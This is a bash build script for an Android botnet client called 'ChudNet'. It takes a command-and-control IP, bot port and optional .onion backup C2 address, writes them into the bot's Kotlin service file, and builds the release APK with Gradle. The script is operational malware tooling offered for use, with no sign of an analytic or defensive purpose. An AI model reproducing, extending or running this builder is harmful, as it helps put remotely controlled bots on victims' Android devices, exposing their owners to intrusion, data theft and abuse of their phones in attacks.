#!/bin/bash
# ChudNet APK Builder (Kotlin)
# Requires: Android SDK, JDK 8+

if [ $# -lt 1 ]; then
    echo "Usage: $0 <CNC_IP> [CNC_PORT] [ONION_DOMAIN]"
    echo "  <CNC_IP>       CNC server IP address"
    echo "  [CNC_PORT]     CNC bot port (default: 7777)"
    echo "  [ONION_DOMAIN] Optional .onion backup address"
    exit 1
fi

CNC_HOST="$1"
CNC_PORT="${2:-7777}"
ONION_ADDR="${3:-}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

SERVICE_FILE="app/src/main/java/com/chud/loadd/ChudService.kt"
sed -i "s/private const val DOMAIN = \"CNC_HOST\";/private const val DOMAIN = \"$CNC_HOST\"/" "$SERVICE_FILE"
sed -i "s/private const val CNC_PORT = 7777;/private const val CNC_PORT = $CNC_PORT/" "$SERVICE_FILE"
if [ -n "$ONION_ADDR" ]; then
    sed -i "s/private const val ONION_DOMAIN: String? = null;/private const val ONION_DOMAIN: String? = \"$ONION_ADDR\"/" "$SERVICE_FILE"
    echo "[*] Onion backup C2: $ONION_ADDR"
fi

if [ -z "$ANDROID_HOME" ]; then
    for candidate in "$HOME/Android/Sdk" "/opt/android-sdk"; do
        if [ -d "$candidate" ]; then
            export ANDROID_HOME="$candidate"
            break
        fi
    done
fi

if [ -z "$ANDROID_HOME" ] || [ ! -d "$ANDROID_HOME" ]; then
    echo "[!] ANDROID_HOME not set / directory not found. Skipping APK build."
    echo "[!] Example: export ANDROID_HOME=\$HOME/Android/Sdk && $0 $CNC_HOST $CNC_PORT"
    exit 0
fi

echo "[*] Building APK with CNC: $CNC_HOST:$CNC_PORT"
echo "[*] Android SDK: $ANDROID_HOME"

# generate gradlew if missing
if [ ! -f "$SCRIPT_DIR/gradlew" ]; then
    echo "[*] Generating gradle wrapper..."
    # create minimal build.gradle for wrapper generation if needed
    if [ ! -f "$SCRIPT_DIR/build.gradle" ]; then
        cat > "$SCRIPT_DIR/build.gradle" << 'BUILDEOF'
buildscript {
    repositories { google(); mavenCentral() }
    dependencies { classpath 'com.android.tools.build:gradle:3.5.4' }
}
BUILDEOF
    fi

    # try to use gradle from SDK to generate wrapper
    GRADLE_BIN=""
    for candidate in \
        "$ANDROID_HOME/tools/gradle" \
        "$ANDROID_HOME/gradle/bin/gradle" \
        "$(which gradle 2>/dev/null)" \
        "$(which gradlew 2>/dev/null)"; do
        if [ -x "$candidate" ]; then GRADLE_BIN="$candidate"; break; fi
    done

    if [ -z "$GRADLE_BIN" ]; then
        # download gradle if not present
        GRADLE_URL="https://services.gradle.org/distributions/gradle-6.7.1-bin.zip"
        echo "[*] Downloading gradle..."
        curl -sL "$GRADLE_URL" -o /tmp/gradle.zip && \
            unzip -qo /tmp/gradle.zip -d /tmp/ && \
            GRADLE_BIN="/tmp/gradle-6.7.1/bin/gradle" && \
            chmod +x "$GRADLE_BIN"
        rm -f /tmp/gradle.zip
    fi

    if [ -n "$GRADLE_BIN" ] && [ -x "$GRADLE_BIN" ]; then
        echo "[*] Running: $GRADLE_BIN wrapper"
        "$GRADLE_BIN" wrapper --gradle-version 6.7.1 2>/dev/null || true
    fi
fi

BUILD_OK=0
if [ -f "$SCRIPT_DIR/gradlew" ]; then
    "$SCRIPT_DIR/gradlew" assembleRelease 2>&1 | tail -10 && BUILD_OK=1
elif [ -x "$(which gradle 2>/dev/null)" ]; then
    gradle assembleRelease 2>&1 | tail -10 && BUILD_OK=1
fi

if [ "$BUILD_OK" = "1" ]; then
    echo "[*] APK built!"
    ls -la app/build/outputs/apk/release/ 2>/dev/null
else
    echo "[!] APK build failed or skipped."
    echo "[!] Requires: Android SDK at ANDROID_HOME, JDK 8+, gradle."
    echo "[!] To build manually after installing gradle:"
    echo "    cd apk && gradle wrapper && ./gradlew assembleRelease"
fi

exit 0
